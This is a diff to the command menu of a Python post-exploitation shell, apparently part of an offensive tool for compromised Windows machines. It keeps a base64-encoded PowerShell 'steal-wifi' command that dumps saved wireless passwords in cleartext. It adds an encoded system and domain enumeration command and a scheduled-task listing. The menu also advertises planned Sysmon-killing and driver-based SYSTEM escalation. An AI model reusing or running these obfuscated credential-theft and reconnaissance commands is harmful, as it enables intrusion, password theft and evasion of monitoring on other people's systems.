@@ -26,8 +26,7 @@ def postExpHelp():
     print("   `Back` or `Exit`:\tReturns to the main menu".expandtabs(40))
     print("   Help:\tPrints this menu".expandtabs(40))
     print("   Steal-wifi:\tGrabs all saved wireless credentials".expandtabs(40))
-    print("   Getprivs:\tGrabs the current user's privileges(TODO)".expandtabs(40))
-    print("   Getuid:\tReturns the current user's UID with the current token(TODO)".expandtabs(40))
+    print("   Basicenum:\tBasic enumeration on the system".expandtabs(40))
     print("   Killproc:\tKills a process by PID(TODO)".expandtabs(40))
     print("   Sysmon-kill:\tStops sysmon(TODO)".expandtabs(40))
     print("   Byod:\tAttempts to elevate to SYSTEM by using the BYOD (Bring-your-own-driver) method(TODO)".expandtabs(40))
@@ -48,6 +47,13 @@ def postExpShell():
 
         elif user_input.lower() == "steal-wifi":
             return 'powershell.exe -e KABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAHAAcgBvAGYAaQBsAGUAcwApACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAiAFwAOgAoAC4AKwApACQAIgAgAHwAIAAlAHsAJABuAGEAbQBlAD0AJABfAC4ATQBhAHQAYwBoAGUAcwAuAEcAcgBvAHUAcABzAFsAMQBdAC4AVgBhAGwAdQBlAC4AVAByAGkAbQAoACkAOwAgACQAXwB9ACAAfAAgACUAewAoAG4AZQB0AHMAaAAgAHcAbABhAG4AIABzAGgAbwB3ACAAcAByAG8AZgBpAGwAZQAgAG4AYQBtAGUAPQAiACQAbgBhAG0AZQAiACAAawBlAHkAPQBjAGwAZQBhAHIAKQB9ACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAiAEsAZQB5ACAAQwBvAG4AdABlAG4AdABcAFcAKwBcADoAKAAuACsAKQAkACIAIAB8ACAAJQB7ACQAcABhAHMAcwA9ACQAXwAuAE0AYQB0AGMAaABlAHMALgBHAHIAbwB1AHAAcwBbADEAXQAuAFYAYQBsAHUAZQAuAFQAcgBpAG0AKAApADsAIAAkAF8AfQAgAHwAIAAlAHsAWwBQAFMAQwB1AHMAdABvAG0ATwBiAGoAZQBjAHQAXQBAAHsAIABQAFIATwBGAEkATABFAF8ATgBBAE0ARQA9ACQAbgBhAG0AZQA7AFAAQQBTAFMAVwBPAFIARAA9ACQAcABhAHMAcwAgAH0AfQAgAHwAIABGAG8AcgBtAGEAdAAtAFQAYQBiAGwAZQAgAC0AQQB1AHQAbwBTAGkAegBlAA=='
+
+        elif user_input.lower() == "basicenum":
+            return 'powershell.exe -e ZQBjAGgAbwAgACIALQAtAC0AdwBoAG8AYQBtAGkALQAtAC0AIgA7AHcAaABvAGEAbQBpACAALwBhAGwAbAA7AGUAYwBoAG8AIAAiAC0ALQAtAHUAcwBlAHIAcwAvAGcAcgBvAHUAcABzAC0ALQAtACIAOwAgAG4AZQB0ACAAdQBzAGUAcgBzADsAbgBlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwADsAbgBlAHQAIABnAHIAbwB1AHAAIAAvAGQAbwBtAGEAaQBuADsAZQBjAGgAbwAgACIALQAtAC0AUABhAHQAYwBoAGUAcwAtAC0ALQAiADsAdwBtAGkAYwAgAHEAZgBlACAAZwBlAHQAIABDAGEAcAB0AGkAbwBuACwARABlAHMAYwByAGkAcAB0AGkAbwBuACwASABvAHQARgBpAHgASQBEACwASQBuAHMAdABhAGwAbABlAGQATwBuADsAZQBjAGgAbwAgACIALQAtAC0ATgBlAHQAdwBvAHIAawAtAC0ALQAiADsAIABuAGUAdABzAGgAIABmAGkAcgBlAHcAYQBsAGwAIABzAGgAbwB3ACAAcwB0AGEAdABlADsAIABuAGUAdABzAGgAIABmAGkAcgBlAHcAYQBsAGwAIABzAGgAbwB3ACAAYwBvAG4AZgBpAGcAOwAgAHIAbwB1AHQAZQAgAHAAcgBpAG4AdAA7AGkAcABjAG8AbgBmAGkAZwAgAC8AYQBsAGwA'
+
+        elif user_input.lower() == "schedtasks":
+            return 'powershell.exe -c "Get-ScheduledTask | Select-Object TaskName,TaskPath,State,TaskToRun | Format-Table -AutoSize"'
+
         else:
             print(Fore.RED + "[-]" + Fore.RESET + " Unknown command: " + user_input)
 
